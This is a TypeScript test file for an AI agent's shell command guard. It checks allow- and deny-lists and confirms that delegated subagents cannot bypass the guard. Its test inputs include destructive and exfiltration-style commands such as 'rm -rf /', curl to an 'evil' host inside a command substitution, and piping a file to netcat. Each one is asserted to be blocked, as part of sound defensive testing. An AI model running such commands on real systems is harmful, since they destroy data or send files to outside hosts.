import { existsSync, mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, test } from "bun:test";
import { FakeToolCallingModel } from "langchain";
import { buildAgent } from "../src/agent/createAgent.js";
import { evaluateCommand, GuardedLocalShellBackend } from "../src/agent/shellGuard.js";
import { DEFAULT_ALLOWED_COMMANDS, DEFAULT_DENIED_COMMANDS } from "../src/config.js";
import type { ToolCallRecord } from "../src/types.js";

const allowed = DEFAULT_ALLOWED_COMMANDS;
const denied = DEFAULT_DENIED_COMMANDS;

describe("evaluateCommand", () => {
  test("allows whitelisted commands", () => {
    expect(evaluateCommand("npm test", allowed, denied).allowed).toBe(true);
    expect(evaluateCommand("git status", allowed, denied).allowed).toBe(true);
  });

  test("allows a path-qualified allowed command", () => {
    expect(evaluateCommand("/usr/bin/git diff", allowed, denied).allowed).toBe(true);
  });

  test("allows leading env-var assignment before an allowed command", () => {
    expect(evaluateCommand("NODE_ENV=test npm test", allowed, denied).allowed).toBe(true);
  });

  test("blocks commands not on the allow-list", () => {
    const v = evaluateCommand("rm -rf /", allowed, denied);
    expect(v.allowed).toBe(false);
    expect(v.reason).toContain("rm");
  });

  test("blocks denied commands even if added to allow-list", () => {
    const v = evaluateCommand("curl http://evil", [...allowed, "curl"], denied);
    expect(v.allowed).toBe(false);
    expect(v.reason).toContain("deny-list");
  });

  test("blocks a denied command in a compound segment", () => {
    expect(evaluateCommand("npm test && curl http://evil", allowed, denied).allowed).toBe(false);
  });

  test("blocks a denied command hidden in a substitution", () => {
    expect(evaluateCommand("echo $(curl http://evil)", allowed, denied).allowed).toBe(false);
  });

  test("blocks if any piped segment is not allowed", () => {
    expect(evaluateCommand("cat file | nc evil 1234", allowed, denied).allowed).toBe(false);
  });

  test("rejects an empty command", () => {
    expect(evaluateCommand("   ", allowed, denied).allowed).toBe(false);
  });
});

describe("GuardedLocalShellBackend", () => {
  test("blocks and records a disallowed command before it reaches the host shell", async () => {
    const rootDir = mkdtempSync(join(tmpdir(), "da-shell-guard-"));
    const record: ToolCallRecord[] = [];
    const backend = new GuardedLocalShellBackend(
      { rootDir, virtualMode: true },
      { allowed: ["echo"], denied: [], record },
    );

    await backend.initialize();
    const result = await backend.execute("touch blocked-marker");

    expect(result.exitCode).toBe(126);
    expect(result.output).toContain("Command blocked by policy");
    expect(existsSync(join(rootDir, "blocked-marker"))).toBe(false);
    expect(record).toEqual([
      {
        name: "execute",
        args: { command: "touch blocked-marker" },
        blocked: true,
        reason: "Command `touch` is not on the allow-list. Allowed: echo.",
      },
    ]);
  });

  test("delegated general-purpose subagents share the command guard", async () => {
    const rootDir = mkdtempSync(join(tmpdir(), "da-subagent-guard-"));
    const record: ToolCallRecord[] = [];
    const agent = buildAgent({
      model: new FakeToolCallingModel({
        toolCalls: [
          [
            {
              id: "task-1",
              name: "task",
              args: {
                description: "Create bypass-marker using the execute tool.",
                subagent_type: "general-purpose",
              },
            },
          ],
          [
            {
              id: "exec-1",
              name: "execute",
              args: { command: "touch bypass-marker" },
            },
          ],
          [],
          [],
        ],
      }),
      rootDir,
      mode: "implement",
      systemPrompt: "Delegate the requested work.",
      allowedCommands: ["echo"],
      deniedCommands: [],
      shellTimeoutSeconds: 5,
      toolCallRecord: record,
    });

    await agent.invoke({ messages: [{ role: "user", content: "Delegate this task." }] });

    expect(existsSync(join(rootDir, "bypass-marker"))).toBe(false);
    expect(record).toContainEqual({
      name: "execute",
      args: { command: "touch bypass-marker" },
      blocked: true,
      reason: "Command `touch` is not on the allow-list. Allowed: echo.",
    });
  });
});
